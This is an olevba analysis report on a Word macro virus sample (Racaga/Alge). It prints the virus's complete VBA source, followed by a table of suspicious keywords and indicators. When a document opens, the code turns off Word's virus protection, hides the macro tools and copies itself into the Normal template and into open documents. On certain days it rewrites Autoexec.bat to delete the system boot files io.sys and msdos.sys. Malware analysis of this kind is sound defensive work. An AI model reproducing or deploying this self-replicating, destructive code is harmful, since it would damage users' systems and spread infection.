olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Racaga-73998222e4841eeb2807fdb88582b006e056a812
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Racaga-73998222e4841eeb2807fdb88582b006e056a812 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Rem barok Alge <There is no way/reasons to hide>
Rem Alge approximate consist of 150 lines.
Rem Rundate: June 05,2003 Cbrhck /CARAGA, Philippines

Option Compare Text
Private Sub Document_Open()
On Error Resume Next
WordBasic.disableautomacros False
ALGE = Options.DefaultFilePath(wdStartupPath)
ImportAlge = ALGE & "\Alge.txt"
With Dialogs(wdDialogFileSummaryInfo)
    .Title = "Alge"
    .Subject = "Luceat Lux Vistra"
    .Author = "Cbrhck"
    .Keywords = "brk"
    .Comments = "RM Diega, I DO LOVE YOU, very much... -TAKE A BUNCH OF CARE- honey!"
    .Execute
End With
    Options.ConfirmConversions = True
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
With CommandBars("Tools")
    .Reset
    .Controls("Macro").Reset
    .Controls("Templates and Add-Ins...").Reset
    .Controls("Customize...").Reset
End With
    For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
    CurrObject = NormalTemplate.VBProject.VBComponents(i).Name
        If (CurrObject <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=CurrObject, Object:=wdOrganizerObjectProjectItems
    Next i
    For Each OpenDoc In Documents
With OpenDoc
    For j = OpenDoc.VBProject.VBComponents.Count To 1 Step -1
    CurrObject = OpenDoc.VBProject.VBComponents(j).Name
        If (CurrObject <> "ThisDocument") And (CurrObject <> "Reference to Normal") Then Application.OrganizerDelete Source:=OpenDoc.FullName, Name:=CurrObject, Object:=wdOrganizerObjectProjectItems
Next j
End With
    Next OpenDoc
        Application.ShowVisualBasicEditor = False
        Application.DisplayAlerts = wdAlertsNone
        ActiveDocument.ReadOnlyRecommended = False
    WordBasic.disableautomacros
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Control Toolbox").Visible = False
    CommandBars("Control Toolbox").Enabled = False
        CustomizationContext = NormalTemplate
            FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
            FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    ALGE = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 150)
        If Dir(ImportAlge) = True Then Kill ImportAlge
    Open ImportAlge For Output Shared As #1
        Print #1, ALGE
        Close #1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Alge", 1, 1, 10, 10) = False Then
numberoflines = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ImportAlge
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Alge", 1, 1, 10, 10) = False Then
numberoflines = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ImportAlge
ActiveDocument.Save
End If
Kill ImportAlge
get2ImplementBatch
End Sub

Private Sub get2ImplementBatch()
Dim freeF As Integer
On Error Resume Next
If (Day(Date) = 15) Or (Day(Date) = 30) Then
Call SetAttr("C:\Autoexec.bat", vbArchive)
freeF = FreeFile
Kill "C:\Autoexec.bat"
Open "C:\Autoexec.bat" For Output As #freeF
Print #freeF, "@Echo Off"
Print #freeF, "Echo Off"
Print #freeF, "Rem barok(Alge) Batch Dummy Implementation"
Print #freeF, "Rem  by: Cbrhck /CARAGA /Philippines"
Print #freeF, ""
Print #freeF, "cls"
Print #freeF, "If Exist C:\Command.Com goto Begin"
Print #freeF, ":Begin"
Print #freeF, "Rem =Alge -cracking your system."
Print #freeF, ""
Print #freeF, "Verify = On"
Print #freeF, "Break = Off"
Print #freeF, "  Set Path=C:\%Path;%1%2%3%4%5"
Print #freeF, "C:\windows\command\attrib c:\io.sys -a -s -h -r"
Print #freeF, "c:\windows\command\attrib c:\msdos.sys -a -s -h -r"
Print #freeF, "del C:\io.sys"
Print #freeF, "de C:\msdos.sys"
Print #freeF, "If Exist C:\Windows\Rundll.exe Copy C:\Windows\Rundll.exe C:\msdos.sys >nul"
Print #freeF, "If Exist C:\Windows\Rundll32.exe Copy C:\Windows\Rundll32.exe C:\io.sys >nul"
Print #freeF, ""
Print #freeF, "cls"
Print #freeF, "echo."
Print #freeF, "echo Alge by: Cbrhck - CARAGA <Luceat Lux Vistra>"
Print #freeF, "echo."
Print #freeF, "echo I'm not really interested to make ""DUMBASS"" your Machine but I shall."
Print #freeF, "echo."
Print #freeF, "echo -->>I miss you so much Jonalyn V. of AP. Butuan City, Philippines"
Print #freeF, "echo."
Print #freeF, "echo -->> I LOVE YOU VERY MUCH!, Take a bunch of Care!! "
Print #freeF, "echo."
Print #freeF, "echo."
Print #freeF, "echo."
Print #freeF, "echo More thanks to myself... my developer's world who really SUCK-UP! your fuck'n did."
Print #freeF, "pause"
Close #freeF
End If
End Sub

Private Sub Document_Close()
Dim CurrDoc
On Error Resume Next
CurrDoc = ActiveDocument.FullName
If CurrDoc.Undo = False And CurrDoc.Redo = False Then
ExitActiveDocument.Close
End If
WordBasic.disableautomacros True
End Sub



















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Rundll.exe          |Executable file name                         |
|IOC       |Rundll32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

